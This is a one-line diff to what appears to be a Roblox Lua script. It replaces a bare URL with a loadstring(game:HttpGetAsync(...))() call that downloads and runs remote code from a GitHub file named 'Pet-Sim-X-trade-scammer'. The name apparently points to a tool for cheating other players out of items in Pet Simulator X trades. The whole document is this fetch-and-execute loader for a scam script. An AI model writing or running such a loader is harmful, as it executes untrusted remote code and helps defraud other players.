@@ -1,1 +1,1 @@
-https://raw.githubusercontent.com/richOP12/Pet-Sim-X-trade-scammer/main/Trade%20Scammer
+loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/richOP12/Pet-Sim-X-trade-scammer/main/Trade%20Scammer", true))()
